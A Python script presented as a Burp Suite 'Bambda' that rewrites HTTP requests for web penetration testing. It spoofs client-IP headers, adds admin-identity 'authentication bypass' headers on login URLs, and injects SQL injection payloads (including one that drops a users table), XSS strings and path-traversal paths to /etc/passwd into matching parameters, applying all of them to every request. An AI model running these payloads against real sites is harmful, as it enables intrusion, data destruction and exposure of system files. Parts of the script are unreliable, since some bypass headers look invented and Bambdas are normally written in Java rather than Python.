#!/usr/bin/env python3
"""
Request Header Modification Bambda
Modifies request headers for security testing
"""

def lambda_handler(request):
    """
    Modify request headers for security testing
    
    Args:
        request: The HTTP request object
        
    Returns:
        Modified request object
    """
    
    # Get request headers
    headers = request.headers
    
    # Add security testing headers
    headers["X-Forwarded-For"] = "192.168.1.100"
    headers["X-Real-IP"] = "192.168.1.100"
    headers["X-Originating-IP"] = "192.168.1.100"
    headers["X-Remote-IP"] = "192.168.1.100"
    headers["X-Remote-Addr"] = "192.168.1.100"
    headers["X-Client-IP"] = "192.168.1.100"
    
    # Add custom user agent for testing
    headers["User-Agent"] = "BurpAutomationTool/1.0"
    
    # Add custom headers for testing
    headers["X-Custom-Header"] = "test_value"
    headers["X-Test-Header"] = "security_test"
    
    # Add authorization bypass headers
    headers["X-Original-URL"] = request.url
    headers["X-Rewrite-URL"] = request.url
    
    # Add cache control headers
    headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    headers["Pragma"] = "no-cache"
    headers["Expires"] = "0"
    
    # Update request with modified headers
    request.headers = headers
    
    return request


def lambda_handler_advanced(request):
    """
    Advanced request modification with conditional logic
    
    Args:
        request: The HTTP request object
        
    Returns:
        Modified request object
    """
    
    # Check if it's a login request
    if "login" in request.url.lower() or "auth" in request.url.lower():
        # Add authentication bypass headers
        headers = request.headers
        headers["X-Forwarded-User"] = "admin"
        headers["X-Forwarded-Email"] = "admin@example.com"
        headers["X-Forwarded-Groups"] = "admin,user"
        
        # Add session fixation headers
        headers["X-Session-ID"] = "test_session_123"
        headers["X-CSRF-Token"] = "bypass_token"
        
        request.headers = headers
    
    # Check if it's an API request
    elif "api" in request.url.lower():
        # Add API testing headers
        headers = request.headers
        headers["X-API-Key"] = "test_api_key_12345"
        headers["X-API-Version"] = "v1"
        headers["X-API-Client"] = "BurpAutomationTool"
        
        request.headers = headers
    
    # Check if it's a file upload request
    elif "upload" in request.url.lower() or "file" in request.url.lower():
        # Add file upload bypass headers
        headers = request.headers
        headers["X-Upload-Override"] = "true"
        headers["X-File-Type"] = "image/jpeg"
        headers["X-File-Size"] = "1024"
        
        request.headers = headers
    
    return request


def lambda_handler_sql_injection(request):
    """
    Modify request for SQL injection testing
    
    Args:
        request: The HTTP request object
        
    Returns:
        Modified request object
    """
    
    # SQL injection payloads
    sql_payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "'; DROP TABLE users--",
        "' UNION SELECT NULL--",
        "admin'--",
        "1' AND '1'='1",
        "1' AND '1'='2"
    ]
    
    # Get request parameters
    params = request.parameters
    
    # Test each parameter with SQL injection payloads
    for param_name, param_value in params.items():
        if param_name.lower() in ["id", "user", "search", "query", "input"]:
            # Replace parameter value with SQL injection payload
            params[param_name] = sql_payloads[0]  # Use first payload for testing
    
    request.parameters = params
    return request


def lambda_handler_xss(request):
    """
    Modify request for XSS testing
    
    Args:
        request: The HTTP request object
        
    Returns:
        Modified request object
    """
    
    # XSS payloads
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
        "'><script>alert('XSS')</script>",
        "<iframe src=javascript:alert('XSS')>",
        "';alert('XSS');//"
    ]
    
    # Get request parameters
    params = request.parameters
    
    # Test each parameter with XSS payloads
    for param_name, param_value in params.items():
        if param_name.lower() in ["search", "q", "query", "input", "param"]:
            # Replace parameter value with XSS payload
            params[param_name] = xss_payloads[0]  # Use first payload for testing
    
    request.parameters = params
    return request


def lambda_handler_path_traversal(request):
    """
    Modify request for path traversal testing
    
    Args:
        request: The HTTP request object
        
    Returns:
        Modified request object
    """
    
    # Path traversal payloads
    traversal_payloads = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    ]
    
    # Get request parameters
    params = request.parameters
    
    # Test each parameter with path traversal payloads
    for param_name, param_value in params.items():
        if param_name.lower() in ["file", "path", "include", "page", "doc"]:
            # Replace parameter value with path traversal payload
            params[param_name] = traversal_payloads[0]  # Use first payload for testing
    
    request.parameters = params
    return request


# Main handler function
def main(request):
    """
    Main handler that applies all modifications
    
    Args:
        request: The HTTP request object
        
    Returns:
        Modified request object
    """
    
    # Apply basic header modifications
    request = lambda_handler(request)
    
    # Apply advanced modifications based on request type
    request = lambda_handler_advanced(request)
    
    # Apply security testing modifications
    request = lambda_handler_sql_injection(request)
    request = lambda_handler_xss(request)
    request = lambda_handler_path_traversal(request)
    
    return request


if __name__ == "__main__":
    # Example usage
    print("Burp Suite Request Modification Bambda")
    print("This script modifies HTTP requests for security testing")
    print("Load this script in Burp Suite's Bambda interface") 